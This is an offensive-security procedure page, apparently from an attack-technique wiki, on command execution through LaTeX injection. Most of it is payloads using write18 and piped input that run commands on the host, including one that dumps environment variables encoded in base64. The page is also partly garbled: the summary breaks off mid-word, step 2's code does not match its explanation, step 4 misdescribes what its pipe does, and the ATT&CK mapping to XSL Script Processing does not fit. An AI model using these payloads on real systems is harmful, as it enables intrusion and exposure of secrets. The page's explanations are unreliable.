---
id: ce883307-75e6-4051-b3b1-4f2fdbd7e5d4
name: LaTex Injection Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:01.801562+00:00'
updated_at: '2023-04-06T03:56:01.815576+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[XSL Script Processing|T1220 - XSL Script Processing]]'
tags:
- '[[Command execution]]'
- '[[LaTex Injection]]'
---

# LaTex Injection Command Execution

## Summary

LaTex is a document preparation system that allows users to create documents with high-quality typesetting. However, it can also be used to execute arbitrary commands on a system. Attackers can inject malicious LaTex code into a document and execute commands on the system. This technique can be use

## Description

# Description

LaTex is a document preparation system that allows users to create documents with high-quality typesetting. However, it can also be used to execute arbitrary commands on a system. Attackers can inject malicious LaTex code into a document and execute commands on the system. This technique can be used to gain access to sensitive data, escalate privileges, or install malware on the system. The LaTex Injection Command Execution procedure provides instructions for executing commands via LaTex injection.

## Requirements

1. Access to a system that has LaTex installed.

## Defense

1. Disable or restrict access to the LaTex executable on systems where it is not needed.

1. Monitor for LaTex injection attempts by analyzing network traffic and system logs.

1. Implement application whitelisting to prevent the execution of unauthorized executables.

## Objectives

1. Execute commands on a target system using LaTex injection.

# Instructions

1. To execute a command and redirect the output to a file, use the following LaTex code:

**Code**: [[\immediate\write18{id > output}
\input{output}]]

> This command will execute the 'id' command and redirect the output to a file named 'output'. The output of the command can be retrieved by reading the contents of the 'output' file.

2. To execute a command and retrieve the output using base64 encoding, use the following LaTex code:

**Code**: [[\verbatiminput]]

> This command will execute the 'id' command and retrieve the output using base64 encoding. The output can be decoded using a base64 decoder.

3. To execute a command and save the output to a file using base64 encoding, use the following LaTex code:

**Code**: [[\immediate\write18{env | base64 > test.tex}
\input]]

> This command will execute the 'env' command and save the output to a file named 'test.tex' using base64 encoding. The output can be decoded using a base64 decoder.

4. To execute a command and pipe the output to another command, use the following LaTex code:

**Code**: [[\input|ls|base64
\input{|"/bin/hostname"}]]

> This command will execute the 'ls' command and pipe the output to the 'base64' command. The output of the 'base64' command will be piped to the '/bin/hostname' command.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[XSL Script Processing|T1220 - XSL Script Processing]]

## Tags

- [[Command execution]]
- [[LaTex Injection]]
